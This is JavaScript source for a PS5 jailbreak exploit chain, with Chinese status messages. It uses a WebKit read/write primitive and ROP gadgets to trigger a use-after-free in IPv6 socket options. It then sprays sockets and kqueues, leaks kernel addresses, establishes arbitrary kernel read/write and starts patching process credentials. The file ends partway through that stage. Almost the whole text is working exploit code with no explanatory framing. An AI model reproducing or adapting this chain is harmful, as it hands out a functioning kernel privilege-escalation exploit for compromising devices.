let chain;
let libSceNKWebKitBase;
let libSceLibcInternalBase;
let libKernelBase;
let textArea = document.createElement("textarea");
let nogc = [];
let syscalls = {};
let gadgets = {};

let OFFSET_KERNEL_pktopts_pktinfo_offset  = 0x10;
let OFFSET_KERNEL_rthdr_offset            = 0x70;
let OFFSET_KERNEL_tclass_offset           = 0xC0;
let SYSCALL_READ                = 0x003;
let SYSCALL_WRITE               = 0x004;
let SYSCALL_CLOSE               = 0x006;
let SYSCALL_GETPID              = 0x014;
let SYSCALL_SOCKET              = 0x061;
let SYSCALL_SETSOCKOPT          = 0x069;
let SYSCALL_GETSOCKOPT          = 0x076;
let SYSCALL_NANOSLEEP           = 0x0F0;
let SYSCALL_KQUEUE              = 0x16A;
let SYSCALL_RTPRIO_THREAD       = 0x1D2;
let SYSCALL_MMAP                = 0x1DD;
let SYSCALL_CPUSET_SETAFFINITY  = 0x1E8;
let SYSCALL_JITSHM_CREATE       = 0x215;
let SYSCALL_JITSHM_ALIAS        = 0x216;
let SYSCALL_DYNLIB_DLSYM        = 0x24F;
let SYSCALL_PIPE2               = 0x2AF;
let AF_INET6     = 28;
let SOCK_DGRAM   = 2;
let IPPROTO_UDP  = 17;
let IPPROTO_IPV6 = 41;
let IPV6_TCLASS         = 61;
let IPV6_2292PKTOPTIONS = 25;
let IPV6_RTHDR          = 51;
let IPV6_PKTINFO        = 46;

let TAG_TCLASS_SPRAY    = 0x41;
let TAG_TCLASS_TAINT    = 0x42;
let TAG_TCLASS_MASTER   = 0x13370000;
let TAG_TCLASS_MASTER_2 = 0x73310000;
let NUM_SPRAY_SOCKS     = 0x190;
let SPRAY_SIZE_KQUEUES  = 0x96;
async function userland() {
    window.msgs.innerText='正在加载 JB\n 此阶段较久, 请耐心等待.';
    let worker = new Worker("rop_slave.js");
    async function wait_for_worker() {
        let p1 = await new Promise((resolve) => {
            const channel = new MessageChannel();
            channel.port1.onmessage = () => {
                channel.port1.close();
                resolve(1);
            }
            worker.postMessage(0, [channel.port2]);
        });
        return p1;
    }
 
    function find_worker() {
        const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
        const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
        const PTHREAD_STACK_SIZE_OFFSET = 0xB0;
        for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
            let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
            let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
            if (stacksz.low == 0x80000) {
                return stack;
            }
        }
        alert("failed to find worker.");
    }

    p.pre_chain = pre_chain;
    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc_dump = malloc_dump;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    // p.readstr = readstr;
    p.writestr = writestr;
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    let textAreaVtable = p.read8(textAreaVtPtr);
    libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);
    libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);
    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }
    function build_rthdr_msg(buf, size) {
        let rthdr_len  = ((size / 0x8) - 1) & ~1;
        let rthdr_size = (rthdr_len + 1) * 0x8;
        for (let i = 0; i < size / 0x4; i++) {
            p.write4(buf.add32(i * 0x4), 0);
        }
        p.write1(buf.add32(0x00), 0);
        p.write1(buf.add32(0x01), rthdr_len);
        p.write1(buf.add32(0x02), 0);
        p.write1(buf.add32(0x03), rthdr_len / 2);
        return rthdr_size;
    }
    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(0x10000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x10000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }
    function array_from_address(addr, size) {
        let og_array = new Uint32Array(0x1000);
        let og_array_i = p.leakval(og_array).add32(0x10);
        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);
        nogc.push(og_array);
        return og_array;
    }
    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        nogc.push(bufView);
        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }
    // function readstr(addr) {
    //     let str = "";
    //     for (let i = 0;; i++) {
    //         let c = p.read1(addr.add32(i));
    //         if (c == 0x0) {
    //             break;
    //         }
    //         str += String.fromCharCode(c);
    //     }
    //     return str;
    // }
    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {
            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }
    await wait_for_worker();
    let worker_stack = find_worker();
    let original_context = p.malloc(0x40);
    let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);
    function pre_chain(chain) {
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }
    async function launch_chain(chain) {
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);
        let p1 = await new Promise((resolve) => {
            const channel = new MessageChannel();
            channel.port1.onmessage = () => {
                channel.port1.close();
                resolve(1);
            }
            worker.postMessage(0, [channel.port2]);
        });
        if (p1 === 0) {
            alert("The rop thread ran away. ");
            p.write8(0, 0);
        }
    }
    chain = new worker_rop();
    let pid = await chain.syscall(20);
    if (pid.low == 0) {
        alert("webkit exploit failed. Try again if your ps5 fw is >= 300 && <= 451.");
        p.write8(0, 0);
        while (1);
    }


    window.msgs.innerText='正在加载 JB\n 此阶段较久, 请耐心等待.';

    await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\x5E\xD0\xB2\0\0\0\0"));
    await chain.run();
      // f4240 = 1989680=10 1DCD6500 = 500ms, 3b9aca00 = 1000ms, 59682f00 =1500ms ,77359400=2000ms, b2d05e00=3000ms
 
    // Offsets (default 4.03)
    let level = 3;
    let which = 1;
    let id = new int64(0xFFFFFFFF, 0xFFFFFFFF);
    let setsize = 0x10;
    let cmask = p.malloc(0x10);
    p.write1(cmask.add32(0x1), 0x40);
    await chain.syscall(SYSCALL_CPUSET_SETAFFINITY, level, which, id, setsize, cmask);
    let prio = p.malloc(0x4);
    p.write2(prio.add32(0x0), 0x1);
    p.write2(prio.add32(0x2), 0x100);
    await chain.syscall(SYSCALL_RTPRIO_THREAD, 1, 0, prio);
    await chain.run();
    let scratch_store          = p.malloc(0x500);
    let fake_pktopts_buf_store = p.malloc(0x100);



    let pipe_read;
    let pipe_write;
    let pipe_mem = p.malloc(0x8);
    await chain.syscall(SYSCALL_PIPE2, pipe_mem, 0);
    pipe_read = p.read4(pipe_mem);
    pipe_write = p.read4(pipe_mem.add32(0x4));
    log("===== Stage 1 - UAF Trigger =====");
    let master_sock_store    = p.malloc(0x4);
    let spray_fds_store      = p.malloc(0x1C0 * 0x4);
    let spray_sockets        = p.array_from_address(spray_fds_store, NUM_SPRAY_SOCKS * 0x4);
    let kqueue_fds_store     = p.malloc(0x100 * 0x4);
    let cmsg_buf_store       = p.malloc(0x18);
    let tclass_spray_store   = p.malloc(0x4);
    let get_tclass_store     = p.malloc(0x8);
    let set_tclass_store     = p.malloc(0x8);
    let tclass_size_store    = p.malloc(0x8);
    await chain.add_syscall_ret(master_sock_store, SYSCALL_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
        await chain.add_syscall_ret(spray_fds_store.add32(i * 0x4), SYSCALL_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    }
    await chain.run();
    log("[+] Created sockets...");
    await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\x65\xCD\x1D\0\0\0\0"));
    await chain.run();
    let master_sock = p.read4(master_sock_store);
    p.write4(cmsg_buf_store.add32(0x00), 0x14);
    p.write4(cmsg_buf_store.add32(0x04), IPPROTO_IPV6);
    p.write4(cmsg_buf_store.add32(0x08), IPV6_TCLASS);
    p.write4(cmsg_buf_store.add32(0x10), 0x0);
    p.write4(tclass_spray_store, TAG_TCLASS_SPRAY);
    p.write4(tclass_size_store, 4);

    log("[+] Setting up use thread...");

    let thread_use_done           = p.malloc(0x8);
    let thread_use_run            = p.malloc(0x8);
    p.write8(thread_use_done, 0);
    p.write8(thread_use_run, 0);

    let thread_use = new thread_rop("rop_thread_use");
    // await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\x65\xCD\x1D\0\0\0\0"));
    await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x80\x96\x89\x19\0\0\0\0"));
    await chain.run();
    {
        p.write1(cmask.add32(0x1), 0x80);
        thread_use.self_healing_syscall(SYSCALL_CPUSET_SETAFFINITY, level, which, id, setsize, cmask);
        thread_use.self_healing_syscall(SYSCALL_RTPRIO_THREAD, 1, 0, prio);
        let master_sock = p.read4(master_sock_store);
        const label_a   = thread_use.get_rsp();
        const cond_done = thread_use.create_branch(thread_use.branch_types.EQUAL, thread_use_done, 1);
        thread_use.self_healing_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\xE1\xF5\x05\0\0\0\0"));

        const label_b   = thread_use.get_rsp();
        const cond_run  = thread_use.create_branch(thread_use.branch_types.EQUAL, thread_use_run, 1);
        thread_use.self_healing_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\xE1\xF5\x05\0\0\0\0"));

        const label_c   = thread_use.get_rsp();
        thread_use.self_healing_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, cmsg_buf_store, 0x18);
        const label_d   = thread_use.get_rsp();
        thread_use.push_write8(thread_use_run, 0x0);
        thread_use.jmp_to_rsp(label_a);
        thread_use.set_branch_points(cond_done, label_d, label_b);
        thread_use.set_branch_points(cond_run, label_c, label_a);
    }
    // alert("OK, 执行JB");
    
    let pthread_use       = await thread_use.spawn_thread();
    await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\xE1\xF5\x05\0\0\0\0"));
    await chain.run();
    await sleep(0);
    log("[+] Triggering UAF...");


    {
        const label_a = chain.get_rsp();
        chain.push_write8(thread_use_run, 0x1);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        chain.push_write8(set_tclass_store, TAG_TCLASS_SPRAY);
        for (let i = 0; i < 0x100; i++) {
            await chain.add_syscall(SYSCALL_SETSOCKOPT, await p.read4(await spray_fds_store.add32(i * 0x4)), IPPROTO_IPV6, IPV6_TCLASS, set_tclass_store, 0x4);
        }
        await chain.add_syscall(SYSCALL_GETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_TCLASS, get_tclass_store, tclass_size_store)// tested
        const cond_overlap = chain.create_branch(thread_use.branch_types.EQUAL, get_tclass_store, TAG_TCLASS_SPRAY);
        await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\xE1\xF5\x05\0\0\0\0")); 
        const label_b = chain.get_rsp();
        for (let i = 0x0; i < 0x100; i++) {
            await chain.add_syscall(SYSCALL_SETSOCKOPT, await p.read4(await spray_fds_store.add32(i * 0x4)), IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        }
        chain.jmp_to_rsp(label_a);
        await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\xE1\xF5\x05\0\0\0\0")); 
        const label_c = chain.get_rsp();
        chain.push_write8(thread_use_done, 0x1);
        chain.push_write8(set_tclass_store, TAG_TCLASS_TAINT);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_TCLASS, set_tclass_store, 0x4);
        for (let i = 0x0; i < NUM_SPRAY_SOCKS; i++) {
            await chain.add_syscall(SYSCALL_GETSOCKOPT, await p.read4(await spray_fds_store.add32(i * 0x4)), IPPROTO_IPV6, IPV6_TCLASS, await tclass_spray_store.add32(i * 0x4), tclass_size_store);
        }
        await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\xE1\xF5\x05\0\0\0\0")); 
        chain.set_branch_points(cond_overlap, label_c, label_b);
    }
    await chain.run();
    log("[+] Triggered.");
    let overlap_found = 0;
    let overlap_idx   = 0;
    let overlap_sock  = 0;
    for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
        if (p.read4(tclass_spray_store.add32(i * 0x4)) == TAG_TCLASS_TAINT) {
            overlap_found = 1;
            overlap_idx   = i;
            overlap_sock  = await p.read4(await spray_fds_store.add32(i * 0x4));
            break;
        }
    }
    if (overlap_found == 0) {
        log("[!] Failed to find overlap, try again.");
        window.msgs.innerText='失败, 请重开或 重启再试.';
        return;
    }
    clean = function (stage=0){
        let rwpair_mem              = p.malloc(0x8);
        let test_payload_store      = p.malloc(0x8);
        let pthread_handle_store    = p.malloc(0x8);
        let pthread_value_store     = p.malloc(0x8);
        let args                    = p.malloc(0x8 * 6);
        p.write8(rwpair_mem, 0);
        p.write8(rwpair_mem.add32(0x4), 0);
        p.write8(test_payload_store, 0);
        p.write8(pthread_handle_store, 0);
        p.write8(pthread_value_store, 0);
        for (let i = 0; i < 0x8 * 6; i++) {
            p.write1(args.add32(i), 0);
        }
        p.write4(rwpair_mem.add32(0x00), master_sock);
        p.write4(rwpair_mem.add32(0x04), victim_sock);
        p.write8(args.add32(0x00), dlsym_addr);
        p.write8(args.add32(0x08), pipe_mem);
        p.write8(args.add32(0x10), rwpair_mem);
        if(stage>4){
        p.write8(args.add32(0x18), pipe_addr);
        p.write8(args.add32(0x20), data_base_addr);
        }
        p.write8(args.add32(0x28), test_payload_store);
        p.write8(0, 0);
    }
    log("[+] Overlap Found.");
    await chain.add_syscall_ret(spray_fds_store.add32(overlap_idx * 0x4), SYSCALL_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    await chain.run();
    log("===== Stage 2 - Overlap pktopts =====");
    let fake_pktopts = async function(target_fd, pktinfo, tag) {
        await chain.add_syscall(SYSCALL_SETSOCKOPT, target_fd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        let size = build_rthdr_msg(fake_pktopts_buf_store, 0x100);
        for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
            let spray_fd = p.read4(spray_fds_store.add32(i * 0x4));
            chain.push_write8(fake_pktopts_buf_store.add32(OFFSET_KERNEL_pktopts_pktinfo_offset), pktinfo);
            chain.push_write4(fake_pktopts_buf_store.add32(OFFSET_KERNEL_tclass_offset), tag | i);
            await chain.add_syscall(SYSCALL_SETSOCKOPT, spray_fd, IPPROTO_IPV6, IPV6_RTHDR, fake_pktopts_buf_store, size);
        }
        await chain.add_syscall(SYSCALL_GETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_TCLASS, scratch_store, tclass_size_store);
        await chain.run();
        tagged_tclass = p.read4(scratch_store);
    }
    p.write4(tclass_spray_store, 0);
    for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
        let spray_fd = p.read4(spray_fds_store.add32(i * 0x4));
        await chain.add_syscall(SYSCALL_SETSOCKOPT, spray_fd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, spray_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass_spray_store, 4);
    }
    await fake_pktopts(overlap_sock, 0, TAG_TCLASS_MASTER);
    await chain.run();
    if ((tagged_tclass & 0xffff0000) != TAG_TCLASS_MASTER) {
        log("[!] Failed to refill pktopts");
        window.msgs.innerText='失败, 请重开或 重启再试.';
        return;
    }
    overlap_idx  = tagged_tclass & 0xFFFF;
    overlap_sock = p.read4(spray_fds_store.add32(overlap_idx * 0x4));
    await chain.add_syscall_ret(spray_fds_store.add32(overlap_idx * 0x4), SYSCALL_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    await chain.run();
    log("===== Stage 3 - Infoleak =====");
    let rthdr_size_store        = p.malloc(0x8);
    let leak_kmalloc_buf_store  = p.malloc(0x800);
    let leak_kmalloc = async function(size) {
        let rthdr_len = build_rthdr_msg(leak_kmalloc_buf_store, size);
        if (size == 0x120) {
            for (let i = 0; i < 0x5C; i++) {
                await chain.add_syscall_ret(kqueue_fds_store.add32(i * 0x4), SYSCALL_KQUEUE);
            }
            await chain.run();
            for (let i = 0; i < 0x5C; i += 0x2) {
                let kq_fd = p.read4(kqueue_fds_store.add32(i * 0x4));
                chain.push_
                await chain.add_syscall(SYSCALL_CLOSE, kq_fd);
            }
        }
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_RTHDR, leak_kmalloc_buf_store, rthdr_len);
        chain.push_write8(rthdr_size_store, size);
        await chain.add_syscall(SYSCALL_GETSOCKOPT, overlap_sock, IPPROTO_IPV6, IPV6_RTHDR, leak_kmalloc_buf_store, rthdr_size_store);
        await chain.run();
    }
    log("[+] Leaking kqueue...");
    for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
        let spray_fd = p.read4(await spray_fds_store.add32(i * 0x4));
        await chain.add_syscall(SYSCALL_SETSOCKOPT, spray_fd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    await leak_kmalloc(0x120);
    let kqueue_addr = p.read8(leak_kmalloc_buf_store.add32(OFFSET_KERNEL_rthdr_offset))
    log("  [+] kqueue = 0x" + kqueue_addr);
    await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
    for (let i = 0; i < SPRAY_SIZE_KQUEUES - 94; i++) {
        await chain.add_syscall_ret(await kqueue_fds_store.add32(i * 0x4), SYSCALL_KQUEUE);
    }
    await chain.run();
    await leak_kmalloc(0x100);
    let pktopts_addr = p.read8(leak_kmalloc_buf_store.add32(OFFSET_KERNEL_rthdr_offset));
    log("  [+] pktopts addr = 0x" + pktopts_addr);
    await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
    p.write4(tclass_spray_store, 0);
    for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
        let spray_fd = await p.read4(await spray_fds_store.add32(i * 0x4));
        await chain.add_syscall(SYSCALL_SETSOCKOPT, spray_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass_spray_store, 4);
    }
    for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
        let spray_fd = await p.read4(await spray_fds_store.add32(i * 0x4));
        await chain.add_syscall(SYSCALL_SETSOCKOPT, spray_fd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, spray_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass_spray_store, 4);
    }
    await chain.run();
    log("===== Stage 4 - Arbitrary Read/Write =====");
    let victim_found = 0;
    let victim_idx   = 0;
    let victim_sock  = 0;
    let write_victim_buf_store = p.malloc(0x14);
    let find_victim_buf_store  = p.malloc(0x14 * NUM_SPRAY_SOCKS);
    let pktinfo_size_store     = p.malloc(0x4);
    let read_buf_store         = p.malloc(0x14);
    let write_buf_store        = p.malloc(0x14);
    p.write4(pktinfo_size_store, 0x14);
    for (let i = 0; i < 0x14; i += 0x4) {
        await p.write4(await write_buf_store.add32(i), 0);
    }
    let write_to_victim = async function(addr) {
        p.write8(await write_victim_buf_store.add32(0x00), addr);
        p.write8(await write_victim_buf_store.add32(0x08), 0);
        p.write4(await write_victim_buf_store.add32(0x10), 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_victim_buf_store, 0x14);
    }
    let find_victim_sock = async function(skip_write) {
        if (skip_write == 0) {
            write_to_victim(await pktopts_addr.add32(OFFSET_KERNEL_pktopts_pktinfo_offset));
        }
        log(" [+] 4 - GETSOCKOPT spray_fd for loop. ");

        for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
            // let spray_fd = p.read4(spray_fds_store.add32(i * 0x4));
            chain.add_syscall(SYSCALL_GETSOCKOPT, await p.read4(spray_fds_store.add32(i * 0x4)), IPPROTO_IPV6, IPV6_PKTINFO, find_victim_buf_store.add32(i * 0x14), pktinfo_size_store);
        }
        await chain.run();
    }
    let kread = async function(addr) {
        await write_to_victim(addr);
        await chain.add_syscall(SYSCALL_GETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, read_buf_store, pktinfo_size_store);
        await chain.run();
    }
    tagged_tclass = 0;
    log(" [+] fake_pktopts. ");
    await fake_pktopts(overlap_sock, pktopts_addr.add32(OFFSET_KERNEL_pktopts_pktinfo_offset), TAG_TCLASS_MASTER_2);
    if ((tagged_tclass & 0xFFFF0000) != TAG_TCLASS_MASTER_2) {
        log("[!] Failed to refill pktopts");
        window.msgs.innerText='失败, 请 重启再试.';
        return;
    }
    log(" [+] settup overlap_idx. ");
    overlap_idx  = tagged_tclass & 0xFFFF;
    overlap_sock = p.read4(await spray_fds_store.add32(overlap_idx * 0x4));
    await chain.add_syscall_ret(spray_fds_store.add32(overlap_idx * 0x4), SYSCALL_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    await chain.run();
    await find_victim_sock(1);
    log(" [+] victiom_sock loop1 ");
    for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
        if (await p.read4(await find_victim_buf_store.add32(i * 0x14)) != 0) {
            victim_found = 1;
            victim_idx   = i;
            victim_sock  = p.read4(spray_fds_store.add32(victim_idx * 0x4));
            log("[!] Bad victim pair, found victim socket: 0x" + victim_sock + " | i = 0x" + i.toString(16));
            window.msgs.innerText='失败, 请 重启再试.';
            return;
        }
    }
    if (victim_found == 1) {
        log("[!] We're screwed, can't continue");
        window.msgs.innerText='失败, 请 重启再试.';
        return;
    }
    await find_victim_sock(0);
    log(" [+] victiom_sock loop2 ");
    for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
        if (await p.read4(await find_victim_buf_store.add32(i * 0x14)) == await pktopts_addr.add32(OFFSET_KERNEL_pktopts_pktinfo_offset).low) {
            victim_found = 1;
            victim_idx   = i;
            victim_sock  = p.read4(spray_fds_store.add32(victim_idx * 0x4));
            break;
        }
    }
    if (victim_found == 0) {
        log("[!] Failed to find victim socket");
        window.msgs.innerText='失败, 请 重启再试';
        p.write8(0, 0);
        return;
    }
    log("[+] Arbitrary kernel read/write established");
    // await sleep(100);
    // await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\x65\xCD\x1D\0\0\0\0")); // f4240 = 1989680=10 1DCD6500 = 500ms, 3b9aca00 = 1000ms, 59682f00 =1500ms ,77359400=2000ms, b2d05e00=3000ms
    // await chain.run();
    let test_addr         = kqueue_addr;
    let kqueue_data_addr  = 0;
    let cur_read          = new int64(0, 0);
    // let read_large_store  = p.malloc_dump(0x10000);
    await p.write4(pktinfo_size_store, 0x14);
    await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x80\x96\x98\x00\0\0\0\0")); 
    await chain.run();
    for (let i = 0; i < 0x800; i += 8) {
        await kread(test_addr.add32(i));
        // await sleep(1);
        await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x40\x42\x0f\x00\0\0\0\0")); 
        await chain.run();
        cur_read = await p.read8(read_buf_store);
        if ((cur_read.low & 0xFFFF) == OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD) {
            kqueue_data_addr = cur_read;
            log("[+] Found kqueue .data address: 0x" + kqueue_data_addr.toString(16) + " (found @ i = 0x" + i.toString(16) + ")");
            break;
        }
    }
    log("[+] onemore times.");
    let found_kqueue_data_addr = 0;
    if (kqueue_data_addr == 0) {
        log("[!] Couldn't find recognized .data address, retrying 10 more times.");

        for (let tries = 0; tries < 10; tries++) {
            await leak_kmalloc(0x120);
            test_addr = await p.read8(await leak_kmalloc_buf_store.add32(OFFSET_KERNEL_rthdr_offset))
            log("  [+] kqueue = 0x" + kqueue_addr);
            await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
            for (let i = 0; i < SPRAY_SIZE_KQUEUES - 94; i++) {
                await chain.add_syscall_ret(await kqueue_fds_store.add32(i * 0x4), SYSCALL_KQUEUE);
            }
            await chain.run();
            for (let i = 0; i < 0x800; i += 8) {
                await kread(await test_addr.add32(i));
                cur_read = await p.read8(read_buf_store);
                if ((cur_read.low & 0xFFFF) == OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD) {
                    kqueue_data_addr = cur_read;
                    found_kqueue_data_addr = 1;
                    log("[+] Retry " + tries.toString(10) + " found kqueue .data address: 0x" + kqueue_data_addr.toString(16) + " (found @ i = 0x" + i.toString(16) + ")");
                    break;
                }
            }
            if (found_kqueue_data_addr == 1) {
                break;
            }
        }
    }
    if (kqueue_data_addr == 0) {
        log("[!] Still couldn't find recognized .data address, reboot.");
        // clean(4);

        window.msgs.innerText='失败, 请重开或 重启再试.';
        return;
    }

    await log("===== Stage 5 - Privilege Escalation / Data Patch =====");

    // Get PID
    await chain.add_syscall_ret(scratch_store, SYSCALL_GETPID);
    await chain.run();
    let cur_pid = p.read4(scratch_store)
    log("[+] PID: 0x" + cur_pid.toString(16));
    kqueue_data_addr = kqueue_data_addr.sub32(OFFSET_KERNEL_DATA_KQUEUE_BASE_SLIDE);
    kqueue_data_addr = kqueue_data_addr.and32(0xFFFFF000);
    let data_base_addr   = kqueue_data_addr;
    let allproc_addr     = data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_ALLPROC);
    let proc_ucred_addr  = 0;
    let proc_fd_addr     = 0;
    log("[+] Found kernel .data base address: 0x" + data_base_addr.toString(16));
    await kread(allproc_addr);
    let cur_proc_addr = p.read8(read_buf_store);
    for (;;) {
        await kread(cur_proc_addr.add32(0x00));
        let next_proc = p.read8(read_buf_store.add32(0x00));
        await kread(cur_proc_addr.add32(0xBC));
        if (p.read4(read_buf_store) == cur_pid) {
            await kread(cur_proc_addr.add32(0x40));
            proc_ucred_addr = p.read8(read_buf_store.add32(0x00));
            proc_fd_addr    = p.read8(read_buf_store.add32(0x08));
            break;
        }
        if (next_proc.low == 0) {
            break;
        }
        cur_proc_addr = next_proc;
    }
    log("  [+] Found proc->p_ucred: 0x" + proc_ucred_addr.toString(16));
    log("  [+] Found proc->p_fd: 0x" + proc_fd_addr.toString(16));
            let ofiles_addr = 0;
    let inc_socket_refcount = async function(target_fd) {
        if (ofiles_addr == 0) {
            chain.push_write8(write_victim_buf_store.add32(0x00), proc_fd_addr.add32(0x00));
            chain.push_write8(write_victim_buf_store.add32(0x08), 0);
            chain.push_write4(write_victim_buf_store.add32(0x10), 0);
            await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_victim_buf_store, 0x14);
            await chain.add_syscall(SYSCALL_GETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, read_buf_store, pktinfo_size_store);
            await chain.run();
            ofiles_addr      = p.read8(read_buf_store).add32(0x08);
        }
        let filedescent_addr = ofiles_addr.add32(target_fd * 0x30);
        chain.push_write8(write_victim_buf_store.add32(0x00), filedescent_addr.add32(0x00));
        chain.push_write8(write_victim_buf_store.add32(0x08), 0);
        chain.push_write4(write_victim_buf_store.add32(0x10), 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_victim_buf_store, 0x14);
